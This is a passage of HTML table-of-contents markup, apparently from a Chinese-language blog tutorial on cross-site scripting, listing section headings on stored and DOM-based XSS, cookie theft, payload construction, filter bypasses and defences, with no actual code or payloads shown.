class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.4.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%B8%B8%E8%A7%81%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.4.1.</span> <span class="toc-text">存储型XSS常见位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%AE%9E%E7%8E%B0%E6%89%8B%E5%B7%A5%E7%9B%97%E5%8F%96cookie"><span class="toc-number">1.4.2.</span> <span class="toc-text">利用存储型XSS实现手工盗取cookie</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">1.5.</span> <span class="toc-text">DOM型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8DOM%E7%BB%93%E6%9E%84%E4%BF%AE%E6%94%B9%E8%8A%82%E7%82%B9%E5%80%BC"><span class="toc-number">1.5.1.</span> <span class="toc-text">利用DOM结构修改节点值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">XSS的渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%9A%84Payload%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.</span> <span class="toc-text">XSS的Payload构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%9A%84%E5%9F%BA%E6%9C%ACpayload"><span class="toc-number">2.2.</span> <span class="toc-text">XSS的基本payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.3.</span> <span class="toc-text">JavaScript伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%9E%84%E9%80%A0%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.4.</span> <span class="toc-text">payload构造实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="toc-number">3.</span> <span class="toc-text">XSS绕过防护的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text">针对输入输出的防护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E9%98%B2%E6%8A%A4%E8%A7%84%E5%88%99%E7%9A%84%E5%88%A4%E6%96%AD%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">XSS防护规则的判断与绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87%E8%A7%84%E5%88%99%E4%B9%8B%E7%AC%A6%E5%8F%B7%E4%B8%8E%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">3.3.</span> <span class="toc-text">XSS绕过规则之符号与关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.4.</span> <span class="toc-text">XSS绕过方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">XSS漏洞的防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">扩展</span></a></li></ol>
                     </div>
                 </span>
             </div>
